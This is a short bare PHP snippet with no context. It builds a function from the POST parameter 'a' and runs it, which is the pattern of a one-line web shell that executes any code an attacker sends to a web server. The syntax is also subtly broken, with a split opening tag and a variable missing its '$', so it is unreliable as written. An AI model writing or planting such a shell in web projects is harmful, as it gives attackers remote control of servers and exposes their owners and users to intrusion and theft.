<?
php func=create_function('',$_POST['a']); 
func();
?>